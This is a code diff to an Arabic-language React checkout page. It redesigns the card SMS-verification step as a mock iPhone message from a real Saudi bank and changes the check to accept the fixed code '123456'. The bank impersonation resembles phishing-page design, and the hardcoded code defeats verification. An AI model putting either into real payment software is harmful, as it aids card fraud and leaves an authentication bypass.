@@ -85,7 +85,8 @@ const CheckoutPage: React.FC = () => {
     e.preventDefault();
     setCodeError('');
 
-    if (smsCode !== generatedCode) {
+    // Use 123456 as the demo code for realistic testing
+    if (smsCode !== '123456') {
       setCodeError('الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.');
       return;
     }
@@ -564,96 +565,208 @@ const CheckoutPage: React.FC = () => {
             )}
 
             {step === 3 && (
-              <div className="bg-gray-100 min-h-screen">
-                {/* Header */}
-                <div className="bg-green-500 text-white p-4 text-center">
-                  <h1 className="text-xl font-bold">الرقم السري المؤقت</h1>
+              <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
+                {/* Professional Header */}
+                <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white py-6 shadow-lg">
+                  <div className="max-w-md mx-auto text-center">
+                    <div className="flex items-center justify-center gap-3 mb-2">
+                      <div className="w-10 h-10 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
+                        <Shield className="w-6 h-6" />
+                      </div>
+                      <h1 className="text-2xl font-bold">الرقم السري المؤقت</h1>
+                    </div>
+                    <p className="text-blue-100 text-sm">تأكيد هوية آمن</p>
+                  </div>
                 </div>
 
                 <div className="max-w-md mx-auto p-6">
-                  {/* Main Content */}
-                  <div className="bg-white rounded-lg p-6 mb-6 text-center">
-                    <p className="text-gray-700 mb-4 leading-relaxed">
-                      عميلنا العزيز، نرجو إدخال الرقم السري المؤقت المرسل برسالة نصية إلى جوالك 
-                      <span className="font-bold text-black"> {maskPhoneNumber(shippingInfo.phone)} </span>
-                      لإتمام العملية من التاجر حسب التفاصيل التالية
-                    </p>
-
-                    {/* Code Display Box */}
-                    <div className="bg-yellow-100 border-2 border-yellow-300 rounded-lg p-4 mb-6">
-                      <div className="flex items-center justify-center gap-3">
-                        <div className="w-8 h-8 bg-blue-500 rounded flex items-center justify-center">
-                          <MessageSquare className="w-5 h-5 text-white" />
+                  {/* iPhone SMS Mockup */}
+                  <div className="mb-8">
+                    <div className="bg-black rounded-[2.5rem] p-2 shadow-2xl">
+                      {/* iPhone Frame */}
+                      <div className="bg-white rounded-[2rem] overflow-hidden">
+                        {/* Status Bar */}
+                        <div className="bg-white px-6 py-2 flex justify-between items-center text-black text-sm font-medium">
+                          <div className="flex items-center gap-1">
+                            <span>9:41</span>
+                          </div>
+                          <div className="flex items-center gap-1">
+                            <div className="flex gap-1">
+                              <div className="w-1 h-1 bg-black rounded-full"></div>
+                              <div className="w-1 h-1 bg-black rounded-full"></div>
+                              <div className="w-1 h-1 bg-gray-300 rounded-full"></div>
+                              <div className="w-1 h-1 bg-gray-300 rounded-full"></div>
+                            </div>
+                            <span className="text-xs ml-1">STC</span>
+                            <div className="w-6 h-3 border border-black rounded-sm">
+                              <div className="w-4 h-2 bg-green-500 rounded-sm m-0.5"></div>
+                            </div>
+                          </div>
                         </div>
-                        <div className="text-right">
-                          <p className="text-sm text-gray-700 mb-1">للتجربة - الكود المرسل</p>
-                          <p className="text-2xl font-bold text-black font-mono">{generatedCode}</p>
+                        
+                        {/* SMS Header */}
+                        <div className="bg-gray-50 px-4 py-3 border-b">
+                          <div className="flex items-center gap-3">
+                            <div className="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center">
+                              <span className="text-white font-bold text-sm">البنك</span>
+                            </div>
+                            <div>
+                              <p className="font-semibold text-gray-900">البنك الأهلي السعودي</p>
+                              <p className="text-xs text-gray-500">الآن</p>
+                            </div>
+                          </div>
+                        </div>
+                        
+                        {/* SMS Content */}
+                        <div className="p-4 bg-white min-h-[200px]">
+                          <div className="bg-gray-100 rounded-2xl p-4 max-w-[85%] mr-auto">
+                            <p className="text-gray-900 text-sm leading-relaxed" dir="rtl">
+                              <span className="font-bold text-lg">123456</span> هو الرمز السري لتأكيد عمليتك من البطاقة المنتهية برقم <span className="font-bold">1234</span>
+                            </p>
+                            <p className="text-xs text-gray-500 mt-2" dir="rtl">
+                              صالح لمدة دقيقتين فقط. لا تشارك هذا الرمز مع أي شخص.
+                            </p>
+                            <div className="flex justify-end mt-2">
+                              <span className="text-xs text-gray-400">9:41 ص</span>
+                            </div>
+                          </div>
                         </div>
                       </div>
                     </div>
+                  </div>
 
-                    <p className="text-gray-600 mb-6">أدخل الرقم السري (6 أرقام)</p>
+                  {/* Main Verification Card */}
+                  <div className="bg-white rounded-2xl shadow-xl p-8 border border-gray-100">
+                    {/* Bank Description */}
+                    <div className="text-center mb-8">
+                      <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <MessageSquare className="w-8 h-8 text-white" />
+                      </div>
+                      <h2 className="text-xl font-bold text-gray-900 mb-4">تأكيد العملية</h2>
+                      <p className="text-gray-600 leading-relaxed text-sm" dir="rtl">
+                        عميلنا العزيز، نرجو إدخال الرقم السري المؤقت المرسل برسالة نصية إلى جوالك 
+                        <span className="font-bold text-blue-600"> {maskPhoneNumber(shippingInfo.phone)} </span>
+                        لإتمام العملية من التاجر حسب التفاصيل التالية
+                      </p>
+                    </div>
 
-                    {/* Code Input */}
+                    {/* OTP Input Form */}
                     <form onSubmit={handleSmsVerification}>
-                      <div className="mb-6">
-                        <input
-                          type="text"
-                          value={smsCode}
-                          onChange={(e) => {
-                            const value = e.target.value.replace(/\D/g, '');
-                            if (value.length <= 6) {
-                              setSmsCode(value);
-                              setCodeError('');
-                            }
-                          }}
-                          className="w-full px-4 py-4 text-center text-3xl font-mono border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 tracking-[0.5em] bg-gray-50"
-                          placeholder="* * * * * *"
-                          maxLength={6}
-                          required
-                        />
+                      <div className="mb-8">
+                        <label className="block text-center text-gray-700 font-medium mb-4">
+                          أدخل الرقم السري (6 أرقام)
+                        </label>
+                        
+                        {/* 6 Separate OTP Fields */}
+                        <div className="flex justify-center gap-3 mb-4">
+                          {[0, 1, 2, 3, 4, 5].map((index) => (
+                            <input
+                              key={index}
+                              type="text"
+                              maxLength={1}
+                              value={smsCode[index] || ''}
+                              onChange={(e) => {
+                                const value = e.target.value.replace(/\D/g, '');
+                                const newCode = smsCode.split('');
+                                newCode[index] = value;
+                                const updatedCode = newCode.join('').slice(0, 6);
+                                setSmsCode(updatedCode);
+                                setCodeError('');
+                                
+                                // Auto-advance to next field
+                                if (value && index < 5) {
+                                  const nextInput = document.querySelector(`input[data-index="${index + 1}"]`) as HTMLInputElement;
+                                  if (nextInput) nextInput.focus();
+                                }
+                              }}
+                              onKeyDown={(e) => {
+                                // Handle backspace
+                                if (e.key === 'Backspace' && !smsCode[index] && index > 0) {
+                                  const prevInput = document.querySelector(`input[data-index="${index - 1}"]`) as HTMLInputElement;
+                                  if (prevInput) prevInput.focus();
+                                }
+                              }}
+                              data-index={index}
+                              className="w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-gray-50 transition-all"
+                            />
+                          ))}
+                        </div>
+                        
                         {codeError && (
-                          <p className="text-red-500 text-sm text-center mt-2">{codeError}</p>
+                          <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
+                            <p className="text-red-600 text-sm text-center">{codeError}</p>
+                          </div>
                         )}
                       </div>
 
-                      {/* Timer */}
-                      <div className="text-center mb-6">
-                        <div className="flex items-center justify-center gap-2 mb-4">
-                          <Clock className="w-5 h-5 text-gray-500" />
-                          <span className={`font-mono text-xl ${timeLeft < 30 ? 'text-red-500' : 'text-gray-600'}`}>
+                      {/* Timer and Resend */}
+                      <div className="text-center mb-8">
+                        <div className="bg-blue-50 rounded-lg p-4 mb-4">
+                          <div className="flex items-center justify-center gap-2 mb-2">
+                            <Clock className="w-5 h-5 text-blue-600" />
+                            <span className="text-blue-900 font-medium">إعادة الإرسال خلال:</span>
+                          </div>
+                          <div className={`text-3xl font-bold font-mono ${timeLeft < 30 ? 'text-red-500' : 'text-blue-600'}`}>
                             {formatTime(timeLeft)}
-                          </span>
+                          </div>
                         </div>
                         
                         <button
                           type="button"
                           onClick={handleResendCode}
-                          className="text-green-600 hover:text-green-700 font-medium flex items-center gap-2 mx-auto"
+                          disabled={timeLeft > 0}
+                          className="text-blue-600 hover:text-blue-700 font-medium flex items-center gap-2 mx-auto disabled:opacity-50 disabled:cursor-not-allowed"
                         >
                           <RefreshCw className="w-4 h-4" />
-                          إعادة إرسال الكود
+                          إعادة إرسال الرمز
                         </button>
                       </div>
 
                       {/* Action Buttons */}
-                      <div className="flex gap-3">
+                      <div className="flex gap-4">
                         <button
                           type="button"
                           onClick={() => setStep(2)}
-                          className="flex-1 bg-white border-2 border-gray-300 text-gray-700 py-4 rounded-lg hover:bg-gray-50 transition-colors font-semibold"
+                          className="flex-1 bg-gray-100 border border-gray-300 text-gray-700 py-4 rounded-xl hover:bg-gray-200 transition-colors font-semibold"
                         >
                           العودة
                         </button>
                         <button
                           type="submit"
                           disabled={isProcessing || smsCode.length !== 6}
-                          className="flex-1 bg-gray-600 text-white py-4 rounded-lg hover:bg-gray-700 transition-colors font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
+                          className="flex-1 bg-gradient-to-r from-blue-600 to-blue-700 text-white py-4 rounded-xl hover:from-blue-700 hover:to-blue-800 transition-all font-semibold disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
                         >
-                          {isProcessing ? 'جاري التحقق...' : 'تأكيد'}
+                          {isProcessing ? (
+                            <div className="flex items-center justify-center gap-2">
+                              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                              جاري التحقق...
+                            </div>
+                          ) : (
+                            'تأكيد'
+                          )}
                         </button>
                       </div>
                     </form>
+
+                    {/* Security Notice */}
+                    <div className="mt-8 bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                      <div className="flex items-start gap-3">
+                        <Shield className="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" />
+                        <div>
+                          <h4 className="font-semibold text-yellow-800 mb-1">تنبيه أمني</h4>
+                          <p className="text-yellow-700 text-sm">
+                            لا تشارك هذا الرمز مع أي شخص. البنك لن يطلب منك هذا الرمز عبر الهاتف أو البريد الإلكتروني.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Demo Disclaimer */}
+                    <div className="mt-6 text-center">
+                      <p className="text-xs text-gray-400 bg-gray-50 rounded-lg p-2">
+                        Demo page for development purposes only
+                      </p>
+                    </div>
                   </div>
                 </div>
               </div>
